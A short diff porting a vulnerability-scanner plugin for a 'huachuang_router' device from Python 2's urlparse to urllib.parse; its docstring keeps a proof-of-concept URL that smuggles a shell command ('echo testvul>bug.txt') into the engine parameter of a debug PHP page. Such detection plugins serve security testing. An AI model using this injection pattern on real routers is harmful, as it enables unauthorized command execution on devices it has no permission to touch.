@@ -12,12 +12,12 @@ POC:
     http://foobar/acc/debug/bytecache_run_action.php?action=1&engine=test'|echo testvul>bug.txt||'a
 '''
 
-import urlparse
+import urllib.parse
 
 
 def assign(service, arg):
     if service == 'huachuang_router':
-        arr = urlparse.urlparse(arg)
+        arr = urllib.parse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 
 def audit(arg):
